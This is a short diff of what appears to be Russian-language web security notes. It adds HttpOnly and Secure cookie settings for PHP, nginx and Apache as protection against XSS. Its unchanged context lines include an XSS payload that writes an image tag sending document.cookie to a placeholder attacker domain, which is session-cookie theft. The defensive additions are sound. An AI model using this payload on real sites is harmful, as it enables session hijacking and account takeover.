@@ -14,3 +14,13 @@ header("Location: http://www.google.ru/");
 #xss угон session кук
 <script>document.write("<img src='http://your domain
 /xxx?cookie="+document.cookie+"'")</script>
+
+
+защита от xss php.ini
+# session.cookie_httponly = True
+# HttpOnly
+#for nginx
+set_cookie_flag HttpOnly secure;
+# for apache2
+Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
+in httpd.conf
